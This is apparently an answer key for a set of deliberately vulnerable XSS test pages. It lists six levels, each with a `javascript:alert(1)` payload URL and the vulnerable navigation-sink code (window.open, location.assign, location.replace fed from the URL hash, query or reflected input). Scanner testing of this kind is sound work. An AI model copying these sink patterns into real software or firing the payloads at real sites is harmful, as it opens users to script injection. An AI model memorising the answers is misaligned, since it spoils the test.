# navsink — solutions

Navigation sinks: a tainted value reaches a navigation API as a URL, and a
`javascript:` scheme there runs script. These cover the *method* / window
forms — `window.open()`, `location.assign()`, `location.replace()` — fed from
`location.hash` / `location.search` or a reflected param. (Plain
`location.href =` assignment lives in the `dom` category.) DOM-aware scanners
detect these by pairing the source with the argument-0 URL position of the
navigation sink. Payload: `javascript:alert(1)`.

### navsink-level1

`/navsink/level1/#javascript:alert(1)`

- payload: `javascript:alert(1)` (in the URL fragment)
- context: `window.open(decodeURIComponent(location.hash.slice(1)))` — the
  scheme runs in the opened window. No quote breakout needed.

### navsink-level2

`/navsink/level2/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `window.open(query, '_blank')` from a `location.search` value.

### navsink-level3

`/navsink/level3/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `location.assign(query)` — the method form runs a `javascript:`
  URL in the current document.

### navsink-level4

`/navsink/level4/#javascript:alert(1)`

- payload: `javascript:alert(1)` (in the URL fragment)
- context: `location.replace(decodeURIComponent(location.hash.slice(1)))`.

### navsink-level5

`/navsink/level5/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: reflected server-side into a JS string (`var url = '...'`) then
  `window.open(url)`. A `'` also breaks out of the JS string.

### navsink-level6

`/navsink/level6/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: reflected server-side into a JS string (`var dest = '...'`) then
  `location.assign(dest)`.
